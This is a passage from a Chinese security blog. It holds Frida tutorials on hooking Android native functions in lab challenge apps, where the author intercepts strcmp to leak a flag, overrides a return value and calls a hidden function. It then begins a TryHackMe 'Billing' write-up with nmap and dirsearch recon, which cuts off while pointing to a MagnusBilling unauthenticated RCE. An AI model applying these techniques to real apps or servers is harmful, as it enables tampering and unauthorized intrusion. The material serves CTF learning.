id="Hook-Native-层调用的函数并读取传入的参数"><a href="#Hook-Native-层调用的函数并读取传入的参数" class="headerlink" title="Hook Native 层调用的函数并读取传入的参数"></a>Hook Native 层调用的函数并读取传入的参数</h1><h2 id="Hook-模板"><a href="#Hook-模板" class="headerlink" title="Hook 模板"></a>Hook 模板</h2><p>Native 层函数 hook 模板</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>    <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Entering&#x27;</span>+functionName);<br>        <span class="hljs-comment">//打印和修改参数</span><br>    &#125;,<br>    <span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Leaving&#x27;</span>+functionName);<br>        <span class="hljs-comment">//打印和修改返回值</span><br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li><code>Interceptor.attach</code>：将回调函数附加到指定的函数地址，挂钩函数，拦截所有对它的调用。</li><li><code>targetAddress</code> ：需要挂钩的本地函数的地址。</li><li><code>onEnter</code>：当挂钩的函数被调用时，提供对函数参数 (<code>args</code>) 的访问，可以执行访问函数的参数，修改参数的值，记录函数调用信息等操作。</li><li><code>onLeave</code>：当挂钩的函数即将退出时，调用此回调，提供对返回值 (<code>retval</code>) 的访问。</li></ul><h2 id="Frida-0x8-Native-Hook"><a href="#Frida-0x8-Native-Hook" class="headerlink" title="Frida 0x8 Native Hook"></a>Frida 0x8 Native Hook</h2><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><p>jadx 打开查看源码，输入的字符串作为 <code>cmpstr</code> 方法的参数，返回1 则显示 flag，能看到 <code>cmpstr</code> 方法实现位于 Native 层</p><p><img src="https://img.dkdun.cn/v1/2025/12/858fe4f6f6c7f820.png"></p><h3 id="Native-层逻辑"><a href="#Native-层逻辑" class="headerlink" title="Native 层逻辑"></a>Native 层逻辑</h3><p>可以发现使用了 <code>strcmp</code> 函数，如果输入的参数  <code>s1</code> 和 <code>s2</code>  比较相等的话返回 0，从而输出结果。因此只需要 hook <code>strcmp</code> 函数拿到它的参数就可以了</p><p><img src="https://img.dkdun.cn/v1/2025/12/807d469991b3a316.png"></p><h3 id="Hook-API"><a href="#Hook-API" class="headerlink" title="Hook API"></a>Hook API</h3><p>hook 之前需要先获取函数地址、函数的导入导出库、库基址等等，如前面的 <code>Module</code> 中的 API。</p><h4 id="查找当前调用的动态库"><a href="#查找当前调用的动态库" class="headerlink" title="查找当前调用的动态库"></a>查找当前调用的动态库</h4><p>第一种就是在 jadx 中能看到，在 <code>frida0x8</code> 库中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>System.loadLibrary(<span class="hljs-string">&quot;frida0x8&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>还有一种方法就是 ida 中找到 <code>String Table</code> 片段</p><p>有一些运行时调用的函数，<code>Java_com_ad2001_frida0x8_MainActivity_cmpstr</code> 对于 Java 类中的 Native 方法 <code>cmpstr</code> ，遵循  JNI 函数的命名规范：<strong>Java_+classname+_+functionname</strong>，其中 <code>classname</code> 是该函数所属的 Java 类的名称，<code>functionname</code> 是该函数的名称。可以看到后面还有一些动态库：<code>libc.so，liblog.so，libm.so，libdl.so，libfrida0x8.so</code>，而 <code>libfrida0x8.so</code> 就是当前分析的动态库，也是需要查找的动态库</p><p><img src="https://img.dkdun.cn/v1/2025/12/b12bc6896c9adb27.png"></p><h4 id="Module-enumerateImports-libname"><a href="#Module-enumerateImports-libname" class="headerlink" title="Module.enumerateImports(libname)"></a>Module.enumerateImports(libname)</h4><p>查看导入函数表</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateImports</span>(<span class="hljs-string">&quot;libfrida0x8.so&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a634dd71c68bc4c5.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">&quot;0x7ffff5e67020&quot;</span>,<br>    <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;/system/lib64/libc.so&quot;</span>,<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;strcmp&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span><br>&#125;,<br></code></pre></td></tr></table></figure><p>根据信息可以得到 <code>strcmp</code> 函数来自于 <code>libc.so</code>，可以使用 <code>Module.getExportByName(libname,funcname)</code> 来找到 <code>strcmp</code> 地址信息</p><h4 id="Module-getExportByName-libname-funcname"><a href="#Module-getExportByName-libname-funcname" class="headerlink" title="Module.getExportByName(libname,funcname)"></a>Module.getExportByName(libname,funcname)</h4><p>获取 <code>strcmp</code> 函数的地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/94586fc7026b26c2.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">0x7ffff5e67020</span><br></code></pre></td></tr></table></figure><h3 id="hook-代码"><a href="#hook-代码" class="headerlink" title="hook 代码"></a>hook 代码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook8</span>(<span class="hljs-params"></span>)&#123;<br><br>    <span class="hljs-keyword">var</span> targetAddress=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Strcmp Address:&quot;</span>,targetAddress.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    <span class="hljs-comment">//打印 strcmp 的地址，以十六进制格式输出</span><br><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> input=<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-comment">// 获取输入的字符串</span><br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;11111&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>                <span class="hljs-comment">// 打印输出 strcmp 的第二个参数的值</span><br>            &#125;<br><br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br><br>        &#125;<br>    &#125;)<br>   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook8</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/0cd696bfcff4ced9.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="如何-Hook"><a href="#如何-Hook" class="headerlink" title="如何 Hook"></a>如何 Hook</h3><p>Hook Java 层函数需要知道函数的包名和类名，但对于 Native 层函数的 hook，需要知道 Native 层函数的地址，然后使用 Frida 的 <code>Interceptor</code>API 进行 Hook</p><h3 id="如何获取函数地址"><a href="#如何获取函数地址" class="headerlink" title="如何获取函数地址"></a>如何获取函数地址</h3><ol><li>查找导入表利用 <code>Module.enumerateImports</code> 获取函数所属库。</li><li>利用函数名，通过 <code>Module.getExportByName</code> 函数获取函数地址。</li><li>通过函数地址拦截输出参数。</li></ol><h1 id="Hook-修改-Native-层函数的返回值"><a href="#Hook-修改-Native-层函数的返回值" class="headerlink" title="Hook 修改 Native 层函数的返回值"></a>Hook 修改 Native 层函数的返回值</h1><h2 id="Hook-模板-1"><a href="#Hook-模板-1" class="headerlink" title="Hook 模板"></a>Hook 模板</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress, &#123;<br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br><br>    &#125;,<br>    <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Leaving &#x27;</span> + functionName);<br>        retval.<span class="hljs-title function_">replace</span>(value)<br>        <span class="hljs-comment">// 将目标函数返回值修改为 value</span><br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Frida-0x9-Native-Hook"><a href="#Frida-0x9-Native-Hook" class="headerlink" title="Frida 0x9 Native Hook"></a>Frida 0x9 Native Hook</h2><h3 id="MainActivity-1"><a href="#MainActivity-1" class="headerlink" title="MainActivity"></a>MainActivity</h3><p><code>check_flag</code> 方法定义在 native 层的  <code>a0x9</code> 库中，方法没有任何调用和返回值，当按钮被点击时，<code>check_flag</code> 的返回值与 1337 比较，如果匹配就输出 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/1185151e0e7ed1e7.png"></p><h3 id="Native-层逻辑-1"><a href="#Native-层逻辑-1" class="headerlink" title="Native 层逻辑"></a>Native 层逻辑</h3><p>返回了个 1，那么只需要使得函数结束后返回 1337 就行了</p><p><img src="https://img.dkdun.cn/v1/2025/12/7d671cab49c80993.png"></p><h3 id="hook-代码-1"><a href="#hook-代码-1" class="headerlink" title="hook 代码"></a>hook 代码</h3><p>查看导出表，找到 JNI 函数名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateExports</span>(<span class="hljs-string">&quot;liba0x9.so&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/12afbf8a84595366.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">&quot;0x7fff57b7a670&quot;</span>, <br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span>, <br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>根据函数名精确查找目标函数地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook9</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> check_flag=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;liba0x9.so&quot;</span>,<span class="hljs-string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span>)<br>    <span class="hljs-comment">// 通过查找导出函数的方式获取目标函数地址</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Func Address:&quot;</span>,check_flag);<br>    <br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(check_flag,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br><br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Origin retval:&quot;</span>,retval);<br>        retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">1337</span>);<br>        &#125;<br>    &#125;)<br>   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook9</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a4bb8d6e41a8292e.png"></p><h1 id="主动调用-Native-层未被调用的方法"><a href="#主动调用-Native-层未被调用的方法" class="headerlink" title="主动调用 Native 层未被调用的方法"></a>主动调用 Native 层未被调用的方法</h1><h2 id="Hook-模板-2"><a href="#Hook-模板-2" class="headerlink" title="Hook 模板"></a>Hook 模板</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> native_adr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(&lt;address_of_the_native_function&gt;);<br><span class="hljs-comment">// 创建一个 NativePointer 对象，用于操作和访问 &lt;address_of_the_native_function&gt;内存地址。</span><br><br><span class="hljs-keyword">const</span> native_function = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(native_adr, <span class="hljs-string">&#x27;&lt;return type&gt;&#x27;</span>, [<span class="hljs-string">&#x27;argument_data_type&#x27;</span>]);<br><span class="hljs-comment">// 创建一个 NativeFunction 对象，实现对 native 函数的调用和控制。</span><br><span class="hljs-comment">// native_adr：使用native_adr NativePointer对象；</span><br><span class="hljs-comment">// &#x27;&lt;return type&gt;&#x27;：函数的返回值类型；</span><br><span class="hljs-comment">// [&#x27;argument_data_type&#x27;]：传递给函数的参数类型列表。</span><br><br><span class="hljs-title function_">native_function</span>(&lt;<span class="hljs-variable language_">arguments</span>&gt;);<br><span class="hljs-comment">// 调用 native_function 函数，如果需要，可以传递&lt;arguments&gt;参数。</span><br></code></pre></td></tr></table></figure><ul><li><code>NativePointer</code>：Frida 中一个表示 native 内存地址的 JavaScript 对象，它用于在 Frida 脚本中操作和访问 native 内存地址，比如读取或写入内存中的数据，调用内存中的函数等。</li><li><code>NativeFunction</code>：Frida 中用于在 JavaScript 中调用 native 函数的对象。通过 NativeFunction 对象，可以在 Frida 脚本中调用 native 共享库（如动态链接库）中的函数，实现对 native 函数的调用和控制。</li></ul><h2 id="Frida-0xA-Native-Hook"><a href="#Frida-0xA-Native-Hook" class="headerlink" title="Frida 0xA Native Hook"></a>Frida 0xA Native Hook</h2><p>雷电模拟器打开直接闪退运行不了，后面换成了 Android Studio</p><h3 id="MainActivity-2"><a href="#MainActivity-2" class="headerlink" title="MainActivity"></a>MainActivity</h3><p>声明了一个 native 层的 <code>stringFromJNI</code> 方法</p><p><img src="https://img.dkdun.cn/v1/2025/12/a7d6e6d8a80d009e.png"></p><h3 id="Native-层逻辑-2"><a href="#Native-层逻辑-2" class="headerlink" title="Native 层逻辑"></a>Native 层逻辑</h3><p>查看  <code>stringFromJNI</code> 方法发现并没有什么有用的信息，同时能看见有一个 <code>get_flag</code> 函数，跟进发现是一个 flag 自解密程序，满足参数和为 3 会触发解密，并将结果通过 <code>__android_log_print</code> 打印在日志中，这个函数在程序中并没有被调用</p><p><img src="https://img.dkdun.cn/v1/2025/12/e3b1b404a1f9260e.png"></p><p>因此方法就是在 frida 之中进行 native 层的声明实例化，主动调用函数</p><h3 id="hook-代码-2"><a href="#hook-代码-2" class="headerlink" title="hook 代码"></a>hook 代码</h3><p>开始直接 hook 这个 <code>get_flag</code> 函数会报错 <code>Error: libfrida0xa.so: unable to find export &#39;get_flag&#39;</code> 找不到这个函数名</p><p><img src="https://img.dkdun.cn/v1/2025/12/8b6f59b1c7195af5.png"></p><p>按 <code>Space</code> 在  <code>get_flag</code> 的反汇编窗口切换文本能发现其实函数名是  <code>_Z8get_flagii</code>，所以换成这个就成功了</p><p><img src="https://img.dkdun.cn/v1/2025/12/448aa425377824d6.png"></p><p>可以根据写出 hook 代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookA</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> addr=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&quot;libfrida0xa.so&quot;</span>,<span class="hljs-string">&quot;_Z8get_flagii&quot;</span>)<br>    <span class="hljs-comment">// 获取 get_flag() 函数地址</span><br>    <span class="hljs-keyword">var</span> get_flag_ptr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(addr);<br><span class="hljs-comment">// 创建一个 NativePointer 对象，用于操作和访问 get_flag() 函数内存地址。</span><br><br>    <span class="hljs-keyword">const</span> get_flag = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(get_flag_ptr, <span class="hljs-string">&#x27;void&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]);<br><span class="hljs-comment">// 创建一个名为 get_flag 的 NativeFunction 对象，实现对 native 函数的调用和控制。</span><br>    <br>    <span class="hljs-title function_">get_flag</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hookA</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/95e0099d84953b70.png"></p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Frida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Andriod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Billing</title>
    <link href="/2025/04/02/THM-Billing/"/>
    <url>/2025/04/02/THM-Billing/</url>
    
    <content type="html"><![CDATA[<p>RCE、sshd、fail2ban</p><span id="more"></span><h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>nmap 扫描</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">nmap -<span class="hljs-built_in">T4</span> -n -<span class="hljs-keyword">sC </span>-sV -Pn -p- <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">225</span>.<span class="hljs-number">254</span><br></code></pre></td></tr></table></figure><p>扫了半个小时，结果如下：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Nmap</span> scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">225.254</span><br><span class="hljs-title class_">Host</span> is up (<span class="hljs-number">0.38</span>s latency).<br><span class="hljs-title class_">Not</span> <span class="hljs-symbol">shown:</span> <span class="hljs-number">65531</span> closed tcp ports (reset)<br><span class="hljs-title class_">PORT</span>     <span class="hljs-title class_">STATE</span> <span class="hljs-title class_">SERVICE</span>  <span class="hljs-title class_">VERSION</span><br><span class="hljs-number">22</span>/tcp   open  ssh      <span class="hljs-title class_">OpenSSH</span> <span class="hljs-number">8.4</span>p1 <span class="hljs-title class_">Debian</span> <span class="hljs-number">5</span>+deb11u3 (protocol <span class="hljs-number">2.0</span>)<br>| ssh-<span class="hljs-symbol">hostkey:</span><br>|   <span class="hljs-number">3072</span> <span class="hljs-number">79</span><span class="hljs-symbol">:ba</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span><span class="hljs-symbol">d:</span><span class="hljs-number">23</span><span class="hljs-symbol">:</span><span class="hljs-number">35</span><span class="hljs-symbol">:b2</span><span class="hljs-symbol">:f0</span><span class="hljs-symbol">:</span><span class="hljs-number">25</span><span class="hljs-symbol">:d7</span><span class="hljs-symbol">:</span><span class="hljs-number">53</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">c5:</span><span class="hljs-symbol">b9:</span><span class="hljs-symbol">af:</span><span class="hljs-symbol">c0:</span>cc (<span class="hljs-title class_">RSA</span>)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">4</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">c3:</span><span class="hljs-number">34</span><span class="hljs-symbol">:af</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:b7</span><span class="hljs-symbol">:</span><span class="hljs-number">35</span><span class="hljs-symbol">:bc</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">f5:</span><span class="hljs-symbol">b0:</span><span class="hljs-symbol">d2:</span><span class="hljs-symbol">aa:</span><span class="hljs-number">35</span><span class="hljs-symbol">:ae</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span> (<span class="hljs-title class_">ECDSA</span>)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">26</span><span class="hljs-symbol">:aa</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span><span class="hljs-symbol">:e0</span><span class="hljs-symbol">:c8</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">a:</span><span class="hljs-symbol">c9:</span><span class="hljs-symbol">d9:</span><span class="hljs-number">98</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span><span class="hljs-symbol">:e4</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">f:</span><span class="hljs-number">87</span><span class="hljs-symbol">:</span><span class="hljs-number">73</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span>d (<span class="hljs-title class_">ED25519</span>)<br><span class="hljs-number">80</span>/tcp   open  http     <span class="hljs-title class_">Apache</span> httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">56</span> ((<span class="hljs-title class_">Debian</span>))<br>| http-<span class="hljs-symbol">robots.txt:</span> <span class="hljs-number">1</span> disallowed entry<br>|_/mbilling/<br>| http-<span class="hljs-symbol">title:</span>             <span class="hljs-title class_">MagnusBilling</span><br>|_Requested resource was <span class="hljs-symbol">http:</span>//<span class="hljs-number">10.10</span>.<span class="hljs-number">225.254</span>/mbilling/<br>|_http-server-<span class="hljs-symbol">header:</span> <span class="hljs-title class_">Apache</span>/<span class="hljs-number">2.4</span>.<span class="hljs-number">56</span> (<span class="hljs-title class_">Debian</span>)<br><span class="hljs-number">3306</span>/tcp open  mysql    <span class="hljs-title class_">MariaDB</span> (unauthorized)<br><span class="hljs-number">5038</span>/tcp open  asterisk <span class="hljs-title class_">Asterisk</span> <span class="hljs-title class_">Call</span> <span class="hljs-title class_">Manager</span> <span class="hljs-number">2.10</span>.<span class="hljs-number">6</span><br><span class="hljs-title class_">Service</span> <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> <span class="hljs-title class_">Linux</span>; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel<br></code></pre></td></tr></table></figure><p>开了 22（SSH），80（HTTP），3306（MariaDB），5038（Asterisk）</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问 80 服务，发现了登录框，一个 MagnusBilling 的程序，MagnusBilling 是一个 VoIP 服务器系统，没什么攻击点</p><p><img src="https://img.dkdun.cn/v1/2025/12/ade8898c175cca9c.png"></p><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>用 dirsearch  浅扫一下目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirsearch</span> -u http://<span class="hljs-number">10.10.88.248</span>/mbilling/ -i <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f43422faa1bddd06.png"></p><p>读取 <code>README.md</code> 发现是 <code>MagnusBilling 7</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/5908119781e5fdaf.png"></p><p>搜 “MagnusBilling 漏洞” 能找到 <a href="https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/">MagnusBilling application unauthenticated Remote Command Execution.</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/5e96c4b6d553333d.png"></p><p>访问 <code>http://10.10.225.254/mbilling/lib</code> 